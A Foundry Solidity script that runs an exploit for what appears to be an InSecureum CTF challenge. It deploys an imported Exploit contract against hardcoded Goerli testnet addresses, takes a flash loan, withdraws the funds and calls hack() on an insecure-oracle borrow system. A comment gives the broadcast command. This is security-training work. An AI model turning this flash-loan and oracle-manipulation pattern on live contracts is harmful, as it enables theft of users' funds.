// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Exploit} from "../test/Challenge3.t.sol";
import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";

//Execute
//forge script script/Challenge3.s.sol:Challenge3Script --rpc-url $GOERLI_RPC_URL --broadcast --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_KEY
   
contract Challenge3Script is Script {
    function setUp() public {}

    function run() public {

        vm.startBroadcast();
        console.log(msg.sender);

        IERC20 token0 = IERC20(0x7aF90A366D9064e9a0628fD0f3964Fd3220572e2);
        IERC20 token1 = IERC20(0x63a385fA36C63D1534F05ba0B8BCd1d0f9717725);
        InSecureumLenderPool flashLoanPool = InSecureumLenderPool(0xabbFF906A74A3E21114114Fe4866AAF71FC41c21);
        BorrowSystemInsecureOracle target = BorrowSystemInsecureOracle(0x1844de6419519f264aC246B60Faa601f24Bc3B32);

        Exploit exploit = new Exploit(
          InsecureDexLP(0x532fDE41689726fD0d85F46945189af5437f0004), 
          target,
          token0, 
          token1);
        
        flashLoanPool.flashLoan(
          address(exploit),
          abi.encodeWithSignature(
            "receiveFlashLoan(address)", address(exploit)
          )
        );

        exploit.withdrawFunds(address(flashLoanPool));
        exploit.hack();

        vm.stopBroadcast();

    }
}
